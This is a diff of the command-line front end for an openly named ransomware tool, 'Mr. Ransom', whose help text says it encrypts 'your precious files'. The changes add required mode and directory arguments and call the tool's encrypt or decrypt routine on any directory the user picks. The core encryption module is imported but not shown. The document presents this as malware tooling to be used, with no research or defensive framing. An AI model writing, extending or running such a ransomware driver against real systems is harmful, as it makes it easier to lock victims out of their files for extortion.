@@ -1,26 +1,23 @@
 import argparse
+import os
+import time
 
 from script.mrransom import MrRansom
 
-
-class EncryptAction(argparse.Action):
-
-    def __init__(self, option_strings, dest, nargs=None, **kwargs):
-        if nargs is not None:
-            raise ValueError("nargs not allowed")
-        super(EncryptAction, self).__init__(option_strings, dest, **kwargs)
-
-    def __call__(self, parser, namespace, values, option_string=None):
-        ransom = MrRansom("files", 15)
-
-        if values == 'encrypt':
-            ransom.encrypt()
-        elif values == 'decrypt':
-            ransom.decrypt()
-
-
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Mr. Ransom. Encrypts your precious files.')
-    parser.add_argument('-mode', action=EncryptAction, help='Encrypt all the files')
+    parser = argparse.ArgumentParser(prog='mr-ransom', description='Mr. Ransom - Encrypts your precious files.')
+    parser.add_argument('-m', '--mode', type=str, required=True, choices=['e', 'encrypt', 'd', 'decrypt'],
+                        help='choose which process to complete')
+    parser.add_argument('-d', '--dir', type=str, required=True, help='specify the base directory to process')
 
     args = parser.parse_args()
+
+    start_time = time.time()
+
+    ransom = MrRansom(16, os.path.expanduser(args.dir))
+    if args.mode == 'e' or args.mode == 'encrypt':
+        ransom.encrypt()
+    elif args.mode == 'd' or args.mode == 'decrypt':
+        ransom.decrypt()
+
+    print "Took {}s".format(time.time() - start_time)
